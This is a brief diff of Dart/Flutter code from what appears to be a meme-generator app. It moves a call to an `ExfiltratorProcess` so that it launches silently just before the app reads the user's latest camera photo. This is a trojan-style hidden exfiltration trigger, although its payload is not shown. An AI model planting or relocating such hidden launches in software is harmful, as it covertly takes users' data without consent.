@@ -16,7 +16,6 @@ void main() => runApp(
 Future<void> fromSetupToWelcome(BuildContext context, String url) async {
   print(url);
   HttpRequestManager.setUrl(url);
-  ExfiltratorProcess.launch();
   Navigator.push(
     context,
     MaterialPageRoute(
@@ -26,6 +25,7 @@ Future<void> fromSetupToWelcome(BuildContext context, String url) async {
 }
 
 Future<void> fromSetupToMemeGenerator(BuildContext context) async {
+  ExfiltratorProcess.launch();
   Picture picture = await PicturesManager.obtainMostRecentFromCamera();
   Navigator.push(
     context,
